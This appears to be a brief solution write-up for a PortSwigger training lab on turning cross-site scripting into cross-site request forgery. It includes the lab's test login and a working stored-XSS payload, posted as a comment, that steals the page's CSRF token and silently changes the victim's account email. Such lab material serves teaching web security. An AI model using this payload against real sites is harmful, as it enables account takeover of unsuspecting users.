# Lab: Exploiting XSS to perform CSRF
# https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

```bash
# Login with wiener:peter.
# Change your email to a@gmail.com.
# Go to burp suite and check change-email request from target.

email=a%40gmail.com&csrf=yav7UlslXvgzxLqvoNbzajag9TA11UVC

# We need to take our targets csrf.
```

```bash
# Create comment with this code and you will be done.

<script>
window.addEventListener('DOMContentLoaded', function(){
var token = document.getElementsByName('csrf')[0].value;


var data = new FormData();

data.append('csrf', token);
data.append('email', 'abcdef@gmail.com');


fetch('/my-account/change-email', {
 method: 'POST',
 mode: 'no-cors',
 body: data
});
});
</script>
```
